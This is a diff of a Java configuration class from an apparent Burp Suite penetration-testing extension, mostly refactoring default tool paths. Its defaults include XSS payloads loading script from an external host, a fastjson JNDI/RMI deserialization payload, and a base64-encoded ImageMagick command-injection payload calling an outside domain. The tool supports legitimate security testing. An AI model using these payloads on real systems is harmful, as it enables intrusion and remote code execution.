@@ -1,11 +1,16 @@
 package config;
 
+import java.io.PrintWriter;
+import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.HashSet;
+import java.util.List;
+import java.util.Set;
+
 import javax.swing.table.AbstractTableModel;
+
 import burp.BurpExtender;
 import burp.Utils;
-
-import java.io.PrintWriter;
-import java.util.*;
 
 
 public class ConfigTableModel extends AbstractTableModel{
@@ -19,38 +24,50 @@ public class ConfigTableModel extends AbstractTableModel{
 	private static final String[] titles = new String[] {
 			"Key", "Value", "Type", "Enable", "Comment"
 	};
+	
+	public static final String Nmap_Mac = "/usr/local/bin/nmap";
+	public static final String Nmap_Windows = "D:\\Program Files (x86)\\Nmap\\nmap.exe";
+	public static final String Firefox_Mac = "/Applications/Firefox.app/Contents/MacOS/firefox";
+	public static final String Firefox_Windows = "D:\\Program Files\\Mozilla Firefox\\firefox.exe";
 
 	public ConfigTableModel(){
 
 		configEntries.add(new ConfigEntry("Put_MenuItems_In_One_Menu", "",ConfigEntry.Config_Basic_Variable,true,false));
 		configEntries.add(new ConfigEntry("DNSlogServer", "bit.0y0.link",ConfigEntry.Config_Basic_Variable,true,false));
-		configEntries.add(new ConfigEntry("browserPath", "C:\\Program Files\\Mozilla Firefox\\firefox.exe",ConfigEntry.Config_Basic_Variable,true,false));
+		if (Utils.isMac()) {
+			configEntries.add(new ConfigEntry("browserPath", Firefox_Mac,ConfigEntry.Config_Basic_Variable,true,false));
+		}else {
+			configEntries.add(new ConfigEntry("browserPath", Firefox_Windows,ConfigEntry.Config_Basic_Variable,true,false));
+		}
 		configEntries.add(new ConfigEntry("tokenHeaders", "token,Authorization,Auth,jwt",ConfigEntry.Config_Basic_Variable,true,false));
 		configEntries.add(new ConfigEntry("DismissedHost", "*.firefox.com,*.mozilla.com",ConfigEntry.Config_Basic_Variable,true,false));
 		configEntries.add(new ConfigEntry("DismissedURL", "",ConfigEntry.Config_Basic_Variable,true,false));
 		configEntries.add(new ConfigEntry("DismissAction", "enable = ACTION_DROP; disable = ACTION_DONT_INTERCEPT",ConfigEntry.Config_Basic_Variable,true,false,"enable this config to use ACTION_DROP,disable to use ACTION_DONT_INTERCEPT"));
 		configEntries.add(new ConfigEntry("XSS-Payload", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Config_Basic_Variable,true,false));
-		
+
 		configEntries.add(new ConfigEntry("SQLMap-Python-Path","",ConfigEntry.Config_Basic_Variable,false,false));
 		configEntries.add(new ConfigEntry("SQLMap-SQLMap.py-Path","",ConfigEntry.Config_Basic_Variable,false,false));
 		configEntries.add(new ConfigEntry("SQLMap-Request-File-Path","D:\\sqlmap-request-files",ConfigEntry.Config_Basic_Variable,true,false));
 		configEntries.add(new ConfigEntry("SQLMap-Options","--risk=3 --level=3",ConfigEntry.Config_Basic_Variable,true,false));
-		
-		configEntries.add(new ConfigEntry("Nmap-File-Path","D:\\Program Files (x86)\\Nmap\\nmap.exe",ConfigEntry.Config_Basic_Variable,true,false));
+		if (Utils.isMac()){//Mac中，通过脚本执行的也会有命令历史记录，使用这种方式最好
+			configEntries.add(new ConfigEntry("Nmap-File-Path",Nmap_Mac,ConfigEntry.Config_Basic_Variable,true,false));
+		}else {
+			configEntries.add(new ConfigEntry("Nmap-File-Path",Nmap_Windows,ConfigEntry.Config_Basic_Variable,true,false));
+		}
 		if (Utils.isMac()){//Mac中，通过脚本执行的也会有命令历史记录，使用这种方式最好
 			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,false,false,"this config effect sqlmap and nmap"));
 		}else {
 			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,true,false,"this config effect sqlmap and nmap"));
 		}
-		
+
 		configEntries.add(new ConfigEntry("Chunked-Length", "10",ConfigEntry.Config_Chunked_Variable,true,false));
 		configEntries.add(new ConfigEntry("Chunked-AutoEnable", "",ConfigEntry.Config_Chunked_Variable,false,false));
 		configEntries.add(new ConfigEntry("Chunked-UseComment", "",ConfigEntry.Config_Chunked_Variable,true,false));
-		
+
 		configEntries.add(new ConfigEntry("Proxy-ServerList", "127.0.0.1:8888;127.0.0.1:9999;",ConfigEntry.Config_Proxy_Variable,false,false));
 		configEntries.add(new ConfigEntry("Proxy-UseRandomMode", "",ConfigEntry.Config_Proxy_Variable,true,false));
 		//以上都是固定基础变量，不需要修改名称和类型
-		
+
 		configEntries.add(new ConfigEntry("Last-Modified", "",ConfigEntry.Action_Remove_From_Headers,true));
 		configEntries.add(new ConfigEntry("If-Modified-Since", "",ConfigEntry.Action_Remove_From_Headers,true));
 		configEntries.add(new ConfigEntry("If-None-Match", "",ConfigEntry.Action_Remove_From_Headers,true));
@@ -60,7 +77,7 @@ public class ConfigTableModel extends AbstractTableModel{
 		configEntries.add(new ConfigEntry("knife", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=bit.0y0.link/%host>",ConfigEntry.Action_Add_Or_Replace_Header,true));
 
 		configEntries.add(new ConfigEntry("fastjson", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://%host.fastjson.test.dnslog.com/evil\",\"autoCommit\":true}",ConfigEntry.Config_Custom_Payload,true));
-		
+
 		configEntries.add(new ConfigEntry("Imagemagick","cHVzaCBncmFwaGljLWNvbnRleHQNCnZpZXdib3ggMCAwIDY0MCA0ODANCmltYWdlIG92ZXIgMCwwIDAsMCAnaHR0cHM6Ly9pbWFnZW1hZ2ljLmJpdC4weTAubGluay94LnBocD94PWB3Z2V0IC1PLSAlcyA+IC9kZXYvbnVsbGAnDQpwb3AgZ3JhcGhpYy1jb250ZXh0",ConfigEntry.Config_Custom_Payload_Base64,true));
 
 	}
@@ -96,7 +113,7 @@ public class ConfigTableModel extends AbstractTableModel{
 		}
 		return null;
 	}
-	
+
 	public String getConfigTypeByKey(String key) {
 		for (ConfigEntry entry:configEntries) {
 			if (entry.getKey().equals(key) && entry.isEnable()) {
@@ -221,14 +238,14 @@ public class ConfigTableModel extends AbstractTableModel{
 		}
 	}
 
-	
-    /*
-     * Don't need to implement this method unless your table's
-     * data can change.
-     */
+
+	/*
+	 * Don't need to implement this method unless your table's
+	 * data can change.
+	 */
 	@Override
-    public void setValueAt(Object value, int row, int col) {
-    	ConfigEntry entry = configEntries.get(row);
+	public void setValueAt(Object value, int row, int col) {
+		ConfigEntry entry = configEntries.get(row);
 		switch (col)
 		{
 		case 0:
@@ -241,11 +258,11 @@ public class ConfigTableModel extends AbstractTableModel{
 			entry.setType((String) value);
 			break;
 		case 3://当显示true/false的时候，实质是字符串，需要转换。当使用勾选框的时候就是boolen
-//			if (((String)value).equals("true")) {
-//				entry.setEnable(true);
-//			}else {
-//				entry.setEnable(false);
-//			}
+			//			if (((String)value).equals("true")) {
+			//				entry.setEnable(true);
+			//			}else {
+			//				entry.setEnable(false);
+			//			}
 			entry.setEnable((boolean)value);
 			break;
 		case 4:
@@ -254,9 +271,9 @@ public class ConfigTableModel extends AbstractTableModel{
 		default:
 			break;
 		}
-        fireTableCellUpdated(row, col);
-    }
-	
+		fireTableCellUpdated(row, col);
+	}
+
 	//////////////////////extend AbstractTableModel////////////////////////////////
 
 	public void addNewConfigEntry(ConfigEntry lineEntry){
